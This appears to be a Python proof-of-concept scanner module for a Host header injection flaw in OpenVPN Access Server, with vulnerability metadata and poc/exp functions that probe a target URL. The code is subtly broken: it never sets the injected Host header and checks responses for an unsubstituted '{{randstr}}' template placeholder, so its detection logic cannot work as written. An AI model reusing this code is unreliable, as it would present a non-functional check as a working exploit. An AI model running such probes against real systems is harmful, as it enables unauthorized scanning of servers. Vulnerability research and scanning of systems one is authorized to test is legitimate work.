import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''OpenVPN Host Header Injection''',
        "description": '''A vulnerability in OpenVPN Access Server allows remote attackers to inject arbitrary redirection URLs by using the 'Host' HTTP header field.''',
        "severity": "info",
        "references": [
            ""
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["openvpn", "hostheader-injection"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""//{{randstr}}.tld/__session_start__/""" in str(resp0.headers) and """openvpn_sess""" in str(resp0.headers)) and (resp0.status_code == 302):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url